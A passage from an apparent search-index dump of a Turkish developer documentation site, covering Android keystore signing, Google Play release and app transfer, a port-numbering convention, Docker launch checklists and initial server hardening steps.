AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:...\n</code></pre> <p>Firebase Console'a Ekleme:</p> <ol> <li>Firebase Console \u2192 Project Settings \u2192 Your apps</li> <li>Android app se\u00e7in</li> <li>Add fingerprint \u2192 SHA-256'y\u0131 yap\u0131\u015ft\u0131r\u0131n</li> <li><code>google-services.json</code> dosyas\u0131n\u0131 yeniden indirin</li> <li><code>android/app/google-services.json</code> dosyas\u0131n\u0131 g\u00fcncelleyin</li> </ol> <p>[!IMPORTANT] Debug ve Release i\u00e7in ayr\u0131 fingerprint'ler:</p> <ul> <li>Debug: <code>~/.android/debug.keystore</code> (otomatik)</li> <li>Release: <code>my-upload-key.keystore</code> (sizin olu\u015fturdu\u011funuz)</li> </ul> <p>Her ikisini de Firebase'e eklemelisiniz!</p>"},{"location":"android/keystore/#64-bit-gereksinimi-2019dan-beri-zorunlu","title":"64-bit Gereksinimi (2019'dan beri zorunlu)","text":"<p>Google Play, 64-bit deste\u011fi zorunlu k\u0131lm\u0131\u015ft\u0131r:</p> <p>android/app/build.gradle:</p> <pre><code>android {\n    defaultConfig {\n        ...\n        ndk {\n            abiFilters \"armeabi-v7a\", \"arm64-v8a\", \"x86\", \"x86_64\"\n        }\n    }\n\n    // Split APKs (\u00f6nerilen)\n    splits {\n        abi {\n            enable true\n            reset()\n            include \"armeabi-v7a\", \"arm64-v8a\"\n            universalApk false\n            enable gradle.startParameter.taskNames.any { it.contains(\"Release\") }\n        }\n    }\n}\n</code></pre> <p>Kontrol:</p> <pre><code># AAB i\u00e7eri\u011fini kontrol et\nunzip -l android/app/build/outputs/bundle/release/app-release.aab | grep \"lib/\"\n\n# \u015eunlar\u0131 g\u00f6rmeli:\n# lib/arm64-v8a/    \u2190 64-bit ARM (zorunlu!)\n# lib/armeabi-v7a/  \u2190 32-bit ARM\n</code></pre>"},{"location":"android/keystore/#internal-testing-track-ilk-upload-icin","title":"Internal Testing Track (\u0130lk Upload \u0130\u00e7in)","text":"<p>Production'a direkt y\u00fckleme yapmamal\u0131s\u0131n\u0131z!</p> <p>Do\u011fru S\u00fcre\u00e7:</p> <ol> <li>Internal Testing \u2192 Tak\u0131m i\u00e7i test (20 ki\u015fiye kadar)</li> <li>Closed Testing \u2192 Beta testerlar (s\u0131n\u0131rs\u0131z)</li> <li>Open Testing \u2192 Herkese a\u00e7\u0131k beta</li> <li>Production \u2192 Canl\u0131 yay\u0131n</li> </ol> <p>Internal Testing Kurulumu:</p> <pre><code>Play Console \u2192 Testing \u2192 Internal testing\n\u2192 Create new release\n\u2192 Upload AAB\n\u2192 Testers \u2192 Create email list\n\u2192 Add emails (max 100)\n\u2192 Save \u2192 Review release \u2192 Start rollout\n</code></pre> <p>Test Linki:</p> <pre><code>https://play.google.com/apps/internaltest/XXXXXXXX\n</code></pre>"},{"location":"android/keystore/#app-size-optimization","title":"App Size Optimization","text":"<p>AAB Boyutunu K\u00fc\u00e7\u00fcltme:</p> <pre><code>// android/app/build.gradle\nandroid {\n    buildTypes {\n        release {\n            // R8 full mode (daha agresif)\n            minifyEnabled true\n            shrinkResources true\n\n            // Proguard optimization\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n        }\n    }\n\n    // Unused resources'lar\u0131 kald\u0131r\n    packagingOptions {\n        exclude 'META-INF/*.kotlin_module'\n        exclude '**/kotlin/**'\n        exclude '**/*.txt'\n        exclude '**/*.version'\n        exclude '**/*.properties'\n    }\n}\n</code></pre> <p>Hermes Engine (React Native 0.70+):</p> <pre><code>// android/app/build.gradle\nproject.ext.react = [\n    enableHermes: true  // Varsay\u0131lan olarak true\n]\n</code></pre> <p>Boyut Analizi:</p> <pre><code># AAB boyutunu analiz et\nbundletool get-size total \\\n  --bundle=android/app/build/outputs/bundle/release/app-release.aab\n\n# APK boyutunu g\u00f6ster\nls -lh android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/keystore/#keystore-kayb-durumunda","title":"Keystore Kayb\u0131 Durumunda","text":"<p>E\u011fer keystore'u kaybettiyseniz:</p> <ol> <li>Google Play App Signing aktifse:</li> <li>\u2705 Upload key'i yenileyebilirsiniz</li> <li>Play Console \u2192 Setup \u2192 App signing \u2192 Request upload key reset</li> <li> <p>Google destek ekibi yard\u0131mc\u0131 olur</p> </li> <li> <p>Google Play App Signing aktif de\u011filse:</p> </li> <li>\u274c Uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Yeni bir uygulama olarak yay\u0131nlaman\u0131z gerekir</li> <li>T\u00fcm kullan\u0131c\u0131lar\u0131, yorumlar\u0131, indirmeleri kaybedersiniz</li> </ol> <p>[!CAUTION] Bu y\u00fczden Google Play App Signing MUTLAKA aktif olmal\u0131!</p>"},{"location":"android/keystore/#store-listing-gereksinimleri","title":"Store Listing Gereksinimleri","text":"<p>Minimum Gereksinimler:</p> <ul> <li>App icon: 512x512px (PNG, 32-bit)</li> <li>Feature graphic: 1024x500px</li> <li>Screenshots: En az 2 adet</li> <li>Phone: 320-3840px (16:9 veya 9:16)</li> <li>7-inch tablet: 1024-7680px</li> <li>10-inch tablet: 1024-7680px</li> </ul> <p>Privacy Policy:</p> <ul> <li>E\u011fer hassas veri topluyorsan\u0131z zorunlu</li> <li>URL olarak sa\u011flanmal\u0131</li> <li>GDPR/KVKK uyumlu olmal\u0131</li> </ul> <p>Content Rating:</p> <ul> <li>IARC anketi doldurulmal\u0131</li> <li>Ya\u015f s\u0131n\u0131r\u0131 belirlenir</li> <li>T\u00fcm \u00fclkeler i\u00e7in ge\u00e7erli</li> </ul>"},{"location":"android/keystore/#data-safety-form-zorunlu","title":"Data Safety Form (ZORUNLU!)","text":"<p>[!CAUTION] Google Play Console'da \"Data Safety\" formu doldurulmadan release olu\u015fturamazs\u0131n\u0131z!</p> <p>Nas\u0131l Doldurulur:</p> <ol> <li>Play Console \u2192 App content \u2192 Data safety</li> <li>Start \u2192 Anketi doldurun</li> </ol> <p>Dikkat Edilmesi Gerekenler:</p> <ul> <li>Firebase Analytics: Evet, veri topluyoruz</li> <li>AdMob: Evet, reklam ID topluyoruz</li> <li>Crash reporting: Evet, crash logs topluyoruz</li> </ul>"},{"location":"android/keystore/#api-33-yeni-gereksinimler-android-13","title":"API 33+ Yeni Gereksinimler (Android 13+)","text":"<p>[!IMPORTANT] targetSdkVersion 33+ kullan\u0131yorsan\u0131z yeni zorunluluklar var!</p> <p>1. Notification Permission (ZORUNLU):</p> <pre><code>&lt;!-- android/app/src/main/AndroidManifest.xml --&gt;\n&lt;manifest&gt;\n    &lt;uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/&gt;\n    ...\n&lt;/manifest&gt;\n</code></pre> <p>React Native'de runtime permission:</p> <pre><code>import { PermissionsAndroid, Platform } from \"react-native\";\n\nasync function requestNotificationPermission() {\n  if (Platform.OS === \"android\" &amp;&amp; Platform.Version &gt;= 33) {\n    const granted = await PermissionsAndroid.request(\n      PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,\n    );\n    return granted === PermissionsAndroid.RESULTS.GRANTED;\n  }\n  return true;\n}\n</code></pre> <p>2. Foreground Service Types:</p> <pre><code>&lt;!-- E\u011fer foreground service kullan\u0131yorsan\u0131z --&gt;\n&lt;service\n    android:name=\".MyForegroundService\"\n    android:foregroundServiceType=\"location|camera|microphone\" /&gt;\n</code></pre> <p>[!WARNING] API 33+ i\u00e7in notification permission zorunlu. Eklemezsaniz bildirimler \u00e7al\u0131\u015fmaz!</p>"},{"location":"android/keystore/#ek-troubleshooting","title":"Ek Troubleshooting \ud83d\udd27","text":""},{"location":"android/keystore/#assetsgorseller-gorunmuyor","title":"Assets/G\u00f6rseller G\u00f6r\u00fcnm\u00fcyor","text":"<p>Sorun: Release APK'da g\u00f6rseller veya fontlar y\u00fcklenmiyor.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Manuel bundle olu\u015ftur\nnpx react-native bundle \\\n  --platform android \\\n  --dev false \\\n  --entry-file index.js \\\n  --bundle-output android/app/src/main/assets/index.android.bundle \\\n  --assets-dest android/app/src/main/res\n\n# Sonra build\ncd android &amp;&amp; ./gradlew assembleRelease\n</code></pre>"},{"location":"android/keystore/#install_failed_update_incompatible","title":"INSTALL_FAILED_UPDATE_INCOMPATIBLE","text":"<p>Sorun: Farkl\u0131 imza ile imzalanm\u0131\u015f eski uygulama y\u00fckl\u00fc.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Eski uygulamay\u0131 kald\u0131r\nadb uninstall com.yourapp\n\n# Yeni APK'y\u0131 y\u00fckle\nadb install android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/keystore/#execution-failed-for-task-appvalidatesigningrelease","title":"Execution failed for task ':app:validateSigningRelease'","text":"<p>Sorun: Keystore bulunam\u0131yor veya \u015fifre yanl\u0131\u015f.</p> <p>Kontrol:</p> <pre><code># Dosya var m\u0131?\nls -la android/app/my-upload-key.keystore\n\n# \u015eifre do\u011fru mu?\nkeytool -list -keystore android/app/my-upload-key.keystore\n\n# gradle.properties do\u011fru mu?\ncat ~/.gradle/gradle.properties\n</code></pre> <p>Yayg\u0131n Hata:</p> <pre><code># \u2705 DO\u011eRU\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\n\n# \u274c YANLI\u015e\nMYAPP_UPLOAD_STORE_FILE=android/app/my-upload-key.keystore\n</code></pre>"},{"location":"android/keystore/#install_parse_failed_no_certificates","title":"INSTALL_PARSE_FAILED_NO_CERTIFICATES","text":"<p>Sorun: APK imzalanmam\u0131\u015f.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code>apksigner verify --verbose app-release.apk\n</code></pre>"},{"location":"android/keystore/#hzl-referans","title":"H\u0131zl\u0131 Referans \ud83d\ude80","text":"Komut A\u00e7\u0131klama <code>./gradlew bundleRelease</code> AAB olu\u015ftur <code>./gradlew assembleRelease</code> APK olu\u015ftur <code>./gradlew clean</code> Cache temizle <code>keytool -list -v -keystore x.keystore</code> Keystore bilgisi <code>apksigner verify app.apk</code> \u0130mza do\u011frula <code>adb install app.apk</code> Cihaza y\u00fckle <p>Dosya Yollar\u0131:</p> <ul> <li>AAB: <code>android/app/build/outputs/bundle/release/app-release.aab</code></li> <li>APK: <code>android/app/build/outputs/apk/release/app-release.apk</code></li> </ul>"},{"location":"android/keystore/#final-checklist","title":"Final Checklist \ud83d\udccb","text":"<p>Release \u00d6ncesi:</p> <ul> <li>[ ] Keystore 3 yerde yedeklendi</li> <li>[ ] <code>targetSdkVersion</code> g\u00fcncel (2024: API 34)</li> <li>[ ] 64-bit support (<code>arm64-v8a</code>)</li> <li>[ ] V3/V4 signing aktif (<code>enableV3Signing</code>, <code>enableV4Signing</code>)</li> <li>[ ] API 33+ notification permission eklendi (gerekirse)</li> <li>[ ] \u0130mza do\u011fruland\u0131</li> <li>[ ] Ger\u00e7ek cihazda test edildi</li> </ul> <p>Google Play:</p> <ul> <li>[ ] App Signing MUTLAKA aktif (2025'te zorunlu!)</li> <li>[ ] Data Safety formu dolduruldu</li> <li>[ ] Internal testing yap\u0131ld\u0131</li> <li>[ ] SHA-256 Firebase'e eklendi (gerekirse)</li> </ul>"},{"location":"android/keystore/#uygulama-satsdevir-sureci","title":"Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci \ud83d\udd04","text":""},{"location":"android/keystore/#keystore-nasl-uretiliyor","title":"Keystore Nas\u0131l \u00dcretiliyor?","text":"<p>[!NOTE] Keystore \u00fcreten ara\u00e7: <code>keytool</code></p> <ul> <li>Java JDK ile birlikte gelir (built-in)</li> <li>Ba\u015fka alternatif ara\u00e7 yok, bu resmi y\u00f6ntem</li> <li>Android Studio'da GUI var ama komut sat\u0131r\u0131 daha g\u00fcvenilir</li> </ul> <p>keytool Nedir?</p> <ul> <li>Java Development Kit (JDK) i\u00e7inde gelen bir komut sat\u0131r\u0131 arac\u0131</li> <li>Dijital sertifika ve keystore y\u00f6netimi i\u00e7in kullan\u0131l\u0131r</li> <li>T\u00fcm platformlarda ayn\u0131 \u015fekilde \u00e7al\u0131\u015f\u0131r (Windows, macOS, Linux)</li> </ul> <p>Kurulum:</p> <pre><code># JDK kurulu mu kontrol et\njava -version\nkeytool -version\n\n# Kurulu de\u011filse:\n# macOS: brew install openjdk@17\n# Windows: Oracle JDK veya Adoptium\n# Linux: sudo apt install openjdk-17-jdk\n</code></pre> <p>Android Studio GUI (Alternatif):</p> <ol> <li>Build \u2192 Generate Signed Bundle/APK</li> <li>Create new keystore</li> <li>Bilgileri doldur</li> <li>Keystore olu\u015fturulur</li> </ol> <p>[!TIP] Komut sat\u0131r\u0131 y\u00f6ntemi daha g\u00fcvenilir ve otomasyon i\u00e7in uygun!</p>"},{"location":"android/keystore/#uygulama-satsdevir-sureci_1","title":"Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci","text":"<p>Senaryo: \"Expense Tracker\" uygulaman\u0131z\u0131 ba\u015fka bir geli\u015ftiriciye sat\u0131yorsunuz.</p>"},{"location":"android/keystore/#adm-1-keystore-transferi","title":"Ad\u0131m 1: Keystore Transferi","text":"<p>Verilmesi Gerekenler:</p> <pre><code># 1. Keystore dosyas\u0131\nexpense-tracker-upload-key.keystore\n\n# 2. Keystore bilgileri (g\u00fcvenli \u015fekilde payla\u015f)\nKeystore Password: ********\nKey Alias: expense-tracker-key\nKey Password: ********\n</code></pre> <p>G\u00fcvenli Transfer Y\u00f6ntemleri:</p> <pre><code># Se\u00e7enek 1: \u015eifreli ZIP\nzip -e keystore-package.zip expense-tracker-upload-key.keystore keystore-info.txt\n# \u015eifreyi ayr\u0131 kanaldan payla\u015f (SMS, telefon)\n\n# Se\u00e7enek 2: Password Manager\n# 1Password, Bitwarden gibi ara\u00e7larla g\u00fcvenli payla\u015f\u0131m\n\n# Se\u00e7enek 3: \u015eifreli Cloud Storage\n# Google Drive (\u015fifreli), Dropbox (\u015fifreli)\n</code></pre> <p>[!CAUTION] Asla email ile \u015fifresiz g\u00f6ndermeyin!</p>"},{"location":"android/keystore/#adm-2-google-play-console-transfer","title":"Ad\u0131m 2: Google Play Console Transfer","text":"<p>Play Console'da Transfer:</p> <ol> <li>Play Console \u2192 Settings \u2192 Developer account</li> <li>Transfer apps se\u00e7ene\u011fini bul</li> <li>Al\u0131c\u0131n\u0131n email adresini ekle</li> <li>Transfer iste\u011fi g\u00f6nder</li> <li>Al\u0131c\u0131 kabul eder</li> </ol> <p>Alternatif: Developer Account De\u011fi\u015fikli\u011fi</p> <p>E\u011fer tam devir yap\u0131lacaksa:</p> <ol> <li>Play Console \u2192 Users and permissions</li> <li>Yeni sahibi Admin olarak ekle</li> <li>Kendini kald\u0131r (veya yetkilerini d\u00fc\u015f\u00fcr)</li> </ol>"},{"location":"android/keystore/#adm-3-devir-sonras-kontrol-listesi","title":"Ad\u0131m 3: Devir Sonras\u0131 Kontrol Listesi","text":"<p>Al\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore dosyas\u0131n\u0131 g\u00fcvenli yere kaydet</li> <li>[ ] \u015eifreleri password manager'a ekle</li> <li>[ ] Test build al (imza do\u011frula)</li> <li>[ ] Google Play Console eri\u015fimini kontrol et</li> <li>[ ] Firebase/Analytics hesaplar\u0131n\u0131 devral (gerekirse)</li> <li>[ ] App Store listing'i g\u00fcncelle (gerekirse)</li> </ul> <p>Sat\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore'u yedekten sil (art\u0131k senin de\u011fil!)</li> <li>[ ] \u015eifreleri password manager'dan kald\u0131r</li> <li>[ ] Play Console eri\u015fimini kald\u0131r</li> <li>[ ] Firebase/Analytics eri\u015fimini kald\u0131r</li> <li>[ ] Kaynak kodunu devret (anla\u015fmaya g\u00f6re)</li> </ul>"},{"location":"android/keystore/#keystore-guvenligi-sats-oncesi","title":"Keystore G\u00fcvenli\u011fi (Sat\u0131\u015f \u00d6ncesi)","text":"<p>Sat\u0131\u015f \u00d6ncesi Haz\u0131rl\u0131k:</p> <pre><code># 1. Keystore bilgilerini dok\u00fcmante et\ncat &gt; transfer-package/README.txt &lt;&lt; EOF\nApp Name: Expense Tracker\nPackage: com.yourcompany.expensetracker\nKeystore File: expense-tracker-upload-key.keystore\nAlias: expense-tracker-key\nCreated: 2024-01-15\nLast Used: 2024-12-20\n\nIMPORTANT:\n- This keystore is CRITICAL for app updates\n- Store passwords in a password manager\n- Keep 3 backups in different locations\n- Never commit to Git\nEOF\n\n# 2. Keystore'u test et\nkeytool -list -v -keystore expense-tracker-upload-key.keystore\n\n# 3. Son bir release build al (do\u011frulama i\u00e7in)\ncd android &amp;&amp; ./gradlew bundleRelease\n</code></pre> <p>Transfer Paketi:</p> <pre><code>transfer-package/\n\u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u251c\u2500\u2500 keystore-info.txt (\u015fifreler)\n\u251c\u2500\u2500 README.txt (talimatlar)\n\u251c\u2500\u2500 last-release.aab (son build)\n\u2514\u2500\u2500 SHA-256-fingerprint.txt (Firebase i\u00e7in)\n</code></pre>"},{"location":"android/keystore/#yasal-hususlar","title":"Yasal Hususlar","text":"<p>[!WARNING] Sat\u0131\u015f S\u00f6zle\u015fmesinde Bulunmas\u0131 Gerekenler:</p> <ul> <li>Keystore'un m\u00fclkiyeti al\u0131c\u0131ya ge\u00e7er</li> <li>Sat\u0131c\u0131 keystore'u silmeyi taahh\u00fct eder</li> <li>Uygulama g\u00fcncellemelerini sadece al\u0131c\u0131 yapabilir</li> <li>Google Play Console eri\u015fimi devredilir</li> <li>Kaynak kodu devri (varsa)</li> </ul> <p>\u00d6rnek Madde:</p> <pre><code>\"Sat\u0131c\u0131, [App Name] uygulamas\u0131n\u0131n Android keystore dosyas\u0131n\u0131,\nilgili \u015fifreleri ve Google Play Console eri\u015fimini al\u0131c\u0131ya\ndevretmeyi kabul eder. Sat\u0131c\u0131, devir sonras\u0131 keystore'u\nsilmeyi ve uygulamay\u0131 g\u00fcncellememyi taahh\u00fct eder.\"\n</code></pre>"},{"location":"android/keystore/#kaynaklar","title":"Kaynaklar \ud83d\udcda","text":"<ul> <li>Android Developer - App Signing</li> <li>React Native - Publishing to Google Play</li> <li>Google Play Console</li> <li>bundletool</li> </ul> <p>\ud83d\udca1 Pro Tip: Keystore'unuzu kaybetmek, uygulaman\u0131z\u0131 kaybetmek demektir. Mutlaka yedekleyin!</p>"},{"location":"architecture/overview/","title":"Architecture Overview","text":"<p>General system architecture and component interactions.</p>"},{"location":"architecture/overview/#high-level-design","title":"High-Level Design","text":"<pre><code>graph TD\n    User[Clients] --&gt;|HTTPS| LB[Load Balancer / Proxy]\n    LB --&gt;|Reverse Proxy| App[Application Containers]\n    App --&gt;|Read/Write| DB[(Primary Database)]\n    App --&gt;|Cache| Redis[(Redis Cache)]\n\n    subgraph Management\n        Monitoring[Prometheus / Grafana]\n        Backup[Backup Service]\n    end\n\n    Monitoring -.-&gt; App\n    Monitoring -.-&gt; DB\n</code></pre>"},{"location":"architecture/overview/#components","title":"Components","text":"<ol> <li>Edge Layer (Nginx/Traefik): Handles SSL termination and routing.</li> <li>Application Layer (Docker): Stateless containers running business logic.</li> <li>Data Layer (PostgreSQL/MySQL): Persistent storage with volume management.</li> <li>Caching (Redis): Session and transient data storage.</li> </ol>"},{"location":"architecture/port-strategy/","title":"Port Stratejisi ve \u0130zolasyon \ud83d\udee1\ufe0f","text":"<p>Karma\u015f\u0131k sunucu yap\u0131lar\u0131nda hangi servisin hangi portta \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 takip etmek zordur. Ayr\u0131ca standart portlar\u0131 (\u00f6rn: 5432, 3306) kullanmak, bot sald\u0131r\u0131lar\u0131n\u0131n ilk hedefi olman\u0131za neden olur.</p> <p>Bu proje a\u015fa\u011f\u0131daki Port Konvansiyonu (S\u00f6zle\u015fmesi) \u00fczerine kuruludur.</p>"},{"location":"architecture/port-strategy/#1-port-bloklar-organizasyon","title":"1. Port Bloklar\u0131 (Organizasyon)","text":"<p>Servisleri t\u00fcrlerine g\u00f6re belirli bloklara ay\u0131rarak y\u00f6netimi kolayla\u015ft\u0131r\u0131yoruz.</p> Blok Aral\u0131\u011f\u0131 Servis Tipi \u00d6rnekler 3000 - 3999 Frontend (UI) Next.js (3000), React (3001), Admin Panel (3002) 4000 - 4999 Backend (API) Node.js API (4000), Go Service (4001), Python Worker (4002) 5000 - 5999 Veritabanlar\u0131 PostgreSQL (5432 -&gt; 54321), Redis (6379 -&gt; 63790) 8000 - 8999 Ops &amp; Admin Traefik Dashboard (8080), Portainer (9000), Monitoring"},{"location":"architecture/port-strategy/#2-security-by-obscurity-gizlilik-ile-guvenlik","title":"2. Security by Obscurity (Gizlilik ile G\u00fcvenlik)","text":"<p>Standart portlar\u0131 de\u011fi\u015ftirmek (Obscurity) tek ba\u015f\u0131na bir g\u00fcvenlik \u00f6nlemi de\u011fildir ancak G\u00fcr\u00fclt\u00fc Kirlili\u011fini (Noise) azalt\u0131r.</p> <p>Otomatik taray\u0131c\u0131lar (botlar) genellikle varsay\u0131lan portlar\u0131 tarar:</p> <ul> <li><code>22</code> (SSH)</li> <li><code>5432</code> (PostgreSQL)</li> <li><code>3306</code> (MySQL)</li> </ul>"},{"location":"architecture/port-strategy/#strateji-sonuna-0-ekle-veya-kaydr","title":"Strateji: \"Sonuna 0 Ekle\" veya \"Kayd\u0131r\"","text":"<p>Veritabanlar\u0131n\u0131 d\u0131\u015f d\u00fcnyaya a\u00e7man\u0131z gerekiyorsa (Geli\u015ftirme amac\u0131yla), standart portu asla kullanmay\u0131n.</p> <p>K\u00f6t\u00fc:</p> <pre><code>ports:\n  - \"5432:5432\" # Herkesin bildi\u011fi Postgre portu\n</code></pre> <p>\u0130yi (Bizim Standart\u0131m\u0131z):</p> <pre><code>ports:\n  - \"54321:5432\" # 5432 -&gt; 54321 (Daha az tahmin edilebilir)\n</code></pre> <p>[!WARNING] Port numaras\u0131n\u0131 de\u011fi\u015ftirmek sizi hedefli sald\u0131r\u0131lardan korumaz. Port taramas\u0131 (nmap) ile a\u00e7\u0131k portlar bulunabilir. Bu y\u00fczden mutlaka UFW (Firewall) ile IP k\u0131s\u0131tlamas\u0131 yap\u0131n.</p>"},{"location":"architecture/port-strategy/#3-ornek-uygulama","title":"3. \u00d6rnek Uygulama","text":"<p>Bir e-ticaret projesi i\u00e7in \u00f6rnek port da\u011f\u0131l\u0131m\u0131:</p> <ul> <li>Frontend (Next.js): <code>3000</code></li> <li>Admin Panel (React): <code>3001</code></li> <li>Main API (.NET): <code>4000</code></li> <li>Payment Service (Node): <code>4001</code></li> <li>PostgreSQL (Global): <code>54321</code> (Host Port) -&gt; <code>5432</code> (Container Port)</li> <li>Redis (Cache): <code>63790</code> (Host) -&gt; <code>6379</code> (Container)</li> </ul>"},{"location":"checklists/app-launch/","title":"App Launch Checklist (Docker) \ud83d\udc33","text":"<p>Uygulaman\u0131z\u0131 Docker ile canl\u0131ya almadan \u00f6nce bu teknik detaylar\u0131 kontrol edin.</p>"},{"location":"checklists/app-launch/#1-container-saglg","title":"1. Container Sa\u011fl\u0131\u011f\u0131 \ud83e\ude7a","text":"<ul> <li>Restart Policy: <code>restart: always</code> veya <code>unless-stopped</code> ayarl\u0131 m\u0131? (Sunucu reboot olunca kalkmal\u0131).</li> <li>Healthcheck: <code>docker ps</code> yazd\u0131\u011f\u0131n\u0131zda <code>(healthy)</code> ibaresini g\u00f6r\u00fcyor musunuz?   <pre><code>healthcheck:\n  test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:80/health\"]\n  interval: 30s\n  retries: 3\n</code></pre></li> </ul>"},{"location":"checklists/app-launch/#2-kaynak-yonetimi","title":"2. Kaynak Y\u00f6netimi \u2696\ufe0f","text":"<ul> <li>Limits: CPU ve RAM limiti koydunuz mu? (Koymazsan\u0131z Memory Leak t\u00fcm sunucuyu kilitler).   <pre><code>deploy:\n  resources:\n    limits:\n      cpus: \"1.0\"\n      memory: 512M\n</code></pre></li> </ul>"},{"location":"checklists/app-launch/#3-loglama-stratejisi","title":"3. Loglama Stratejisi \ud83d\udcdc","text":"<ul> <li>Driver: Docker varsay\u0131lan olarak sonsuz log yazar. Diski doldurmamak i\u00e7in limit \u015fart.   <pre><code>logging:\n  driver: \"json-file\"\n  options:\n    max-size: \"10m\"\n    max-file: \"3\"\n</code></pre></li> </ul>"},{"location":"checklists/app-launch/#4-veri-kalclg-persistence","title":"4. Veri Kal\u0131c\u0131l\u0131\u011f\u0131 (Persistence) \ud83d\udcbe","text":"<ul> <li>Volumes: Veritaban\u0131 verisi (MySQL/Postgres) <code>volume</code> olarak mount edildi mi? (Bind mount veya Named volume).</li> <li>Test: Container'\u0131 sil (<code>docker rm -f</code>) ve tekrar ba\u015flat. Veriler duruyor mu?</li> </ul>"},{"location":"checklists/app-launch/#5-cevresel-degiskenler-env","title":"5. \u00c7evresel De\u011fi\u015fkenler (ENV) \ud83c\udf0d","text":"<ul> <li>Debug Mode: <code>ASPNETCORE_ENVIRONMENT</code> veya <code>NODE_ENV</code> de\u011fi\u015fkeni Production m\u0131?</li> <li>Secrets: API Key'ler kodun i\u00e7inde (hardcoded) de\u011fil, de\u011fil mi?</li> </ul>"},{"location":"checklists/app-launch/#verify-commands","title":"Verify Commands \u2705","text":"<pre><code># 1. Limitleri G\u00f6r\ndocker stats --no-stream\n\n# 2. Log Ayar\u0131n\u0131 G\u00f6r\ndocker inspect --format='{{.HostConfig.LogConfig}}' &lt;container_id&gt;\n\n# 3. Restart Policy G\u00f6r\ndocker inspect --format='{{.HostConfig.RestartPolicy.Name}}' &lt;container_id&gt;\n</code></pre>"},{"location":"checklists/prod-ready/","title":"Go / No-Go Decision Matrix \ud83d\udea6","text":"<p>Canl\u0131ya \u00e7\u0131k\u0131\u015f (Go-Live) bir histen ibaret olamaz. A\u015fa\u011f\u0131daki matris tamamlanmadan TRAF\u0130K Y\u00d6NLEND\u0130R\u0130LEMEZ.</p>"},{"location":"checklists/prod-ready/#blocker-kesin-engel","title":"\ud83d\udd34 Blocker (Kesin Engel)","text":"<p>Bu maddelerden bir tanesi bile eksikse, deployment iptal edilir.</p> <ul> <li>[ ] Data Security: Veritaban\u0131 \u015fifreleri environment variable (env) olarak DE\u011e\u0130L, Secret File olarak mount edilmi\u015f mi?</li> <li>[ ] Firewall: <code>ufw status</code> -&gt; Sadece 80/443/SSH a\u00e7\u0131k. Docker portlar\u0131 (5432, 6379) d\u0131\u015far\u0131 kapal\u0131 m\u0131?</li> <li>[ ] Backup: D\u00fcn geceki yede\u011fi geri d\u00f6nebiliyor muyuz? (Restore Test yap\u0131ld\u0131 m\u0131?)</li> <li>[ ] SSL: Sertifika ge\u00e7erli ve auto-renew (Certbot) aktif mi?</li> <li>[ ] Non-Root: Uygulama container i\u00e7inde <code>root</code> olarak MI \u00e7al\u0131\u015f\u0131yor? (Fail. <code>USER</code> direktifi \u015fart.)</li> </ul>"},{"location":"checklists/prod-ready/#warning-riskli-gecis","title":"\ud83d\udfe1 Warning (Riskli Ge\u00e7i\u015f)","text":"<p>Bu maddeler eksikse Manager onay\u0131 ile ge\u00e7ilebilir ama 24 saat i\u00e7inde d\u00fczeltilmelidir.</p> <ul> <li>[ ] Monitoring: CPU/RAM &gt; %80 olursa Slack'e bildirim geliyor mu?</li> <li>[ ] Logs: Loglar rotate ediliyor mu? (Disk dolarsa sunucu durur.)</li> <li>[ ] Performance: Y\u00fck alt\u0131nda (Load Test) P99 Latency &lt; 500ms mi?</li> <li>[ ] Fallbacks: Veritaban\u0131 giderse kullan\u0131c\u0131ya \"Bak\u0131mday\u0131z\" sayfas\u0131 \u00e7\u0131k\u0131yor mu, yoksa Crash mi oluyor?</li> </ul>"},{"location":"checklists/prod-ready/#good-to-have-iyilestirme","title":"\ud83d\udfe2 Good to Have (\u0130yile\u015ftirme)","text":"<ul> <li>[ ] CDN: Statik dosyalar Cloudflare/CDN \u00fczerinden mi geliyor?</li> <li>[ ] CI/CD: Deploy tek t\u0131kla yap\u0131labiliyor mu?</li> <li>[ ] Docs: Runbook dok\u00fcmanlar\u0131 g\u00fcncel mi?</li> </ul>"},{"location":"checklists/prod-ready/#karar","title":"\ud83d\udcdd Karar","text":"Durum Karar \u0130mza/Onay \u2705 T\u00fcm\u00fc Ye\u015fil GO \ud83d\ude80 M\u00fchendis \u26a0\ufe0f Sar\u0131 Var GO with Risk \ud83e\udd1e Team Lead \u274c K\u0131rm\u0131z\u0131 Var NO-GO \ud83d\uded1 -"},{"location":"checklists/server-first-setup/","title":"Server Verification Protocol (Day 0) \ud83d\udee1\ufe0f","text":"<p>Bir sunucuyu teslim ald\u0131\u011f\u0131n\u0131zda \"yapt\u0131m oldu\" demek yetmez. Do\u011frulamak (Verify) zorundas\u0131n\u0131z.</p>"},{"location":"checklists/server-first-setup/#1-access-identity","title":"1. Access &amp; Identity","text":"Aksiyon Komut Do\u011frulama (Verify) Update <code>apt update &amp;&amp; apt upgrade -y</code> <code>uptime</code> (Load art\u0131\u015f\u0131 yok) Hostname <code>hostnamectl set-hostname &lt;name&gt;</code> <code>hostname</code> komutu yeni ismi d\u00f6nmeli. Sudo User <code>adduser deployer &amp;&amp; usermod -aG sudo deployer</code> <code>getent group sudo</code> \u00e7\u0131kt\u0131s\u0131nda <code>deployer</code> g\u00f6r\u00fcnmeli. SSH Key (Local) <code>ssh-copy-id deployer@&lt;IP&gt;</code> <code>ssh -o PreferredAuthentications=publickey deployer@&lt;IP&gt;</code> \u015fifresiz 